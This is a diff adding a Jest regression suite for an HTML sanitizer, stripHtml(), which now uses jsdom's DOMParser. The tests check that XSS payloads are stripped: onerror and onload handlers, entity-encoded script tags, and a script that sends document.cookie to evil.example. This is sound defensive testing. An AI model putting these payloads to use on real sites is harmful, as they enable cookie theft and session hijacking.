@@ -158,3 +158,60 @@ describe('hasMarkup()', () => {
     expect(hasMarkup('resource "aws_s3_bucket" "x" {}')).toBe(false);
   });
 });
+
+// ─── stripHtml() bypass regression suite (M-06) ───────────────────────────────
+// SECURITY FIX (M-06): backend/utils/sanitize.js's stripHtml() was moved from
+// a regex tag-blacklist to jsdom's real DOMParser, mirroring the frontend's
+// sanitizeHcl.js fix for the same class of bug (BUG-007). These cases cover
+// the payload shapes that typically slip past hand-rolled regex sanitizers.
+describe('stripHtml() bypass regression suite (M-06)', () => {
+  test('strips event-handler attributes on an otherwise plain tag', () => {
+    const out = stripHtml('<img src=x onerror=alert(1)>hello world');
+    expect(out).not.toMatch(/onerror/i);
+    expect(out).toMatch(/hello world/);
+  });
+
+  test('strips svg/onload payloads', () => {
+    const out = stripHtml('<svg onload=alert(1)>resource "aws_vpc" "v" {}');
+    expect(out).not.toMatch(/onload/i);
+    expect(out).toMatch(/aws_vpc/);
+  });
+
+  test('reveals and strips double-encoded tags after entity decoding', () => {
+    // A regex blacklist that strips literal <tag> patterns BEFORE decoding
+    // entities lets this kind of payload through unscathed.
+    const out = stripHtml('&lt;script&gt;alert(1)&lt;/script&gt; normal_var = "${var.x}"');
+    expect(out).not.toMatch(/<script>/i);
+    expect(out).toMatch(/normal_var\s*=\s*"\$\{var\.x\}"/);
+  });
+
+  test('strips tags with attributes spread across newlines', () => {
+    // Regex tag-blacklists that assume attributes sit on one line can miss
+    // this; a real parser handles it the same as any other attribute list.
+    const out = stripHtml('<img\n  src=x\n  onerror=alert(1)>resource "aws_instance" "i" {}');
+    expect(out).not.toMatch(/<img/i);
+    expect(out).not.toMatch(/onerror/i);
+    expect(out).toMatch(/aws_instance/);
+  });
+
+  test('strips mixed-case and nested tags', () => {
+    const out = stripHtml('<DiV><SpAn style="color:blue">nested</SpAn> text</DiV>');
+    expect(out).not.toMatch(/<[a-z]/i);
+    expect(out).toMatch(/nested/);
+    expect(out).toMatch(/text/);
+  });
+
+  test('does not execute or leak script content beyond its text', () => {
+    // jsdom's DOMParser.parseFromString never executes scripts, but confirm
+    // the resulting text does not retain the tag wrapper itself.
+    const out = stripHtml('<script>fetch("//evil.example/steal?c=" + document.cookie)</script>');
+    expect(out).not.toMatch(/<script>/i);
+  });
+
+  test('leaves HCL interpolation syntax and quotes untouched', () => {
+    const hcl = 'value = "${aws_instance.web.public_ip}" # <not a real tag';
+    // No actual `<tag>` closes here, so this should be treated as plain text
+    // and pass through the fast path unchanged.
+    expect(stripHtml(hcl)).toBe(hcl);
+  });
+});
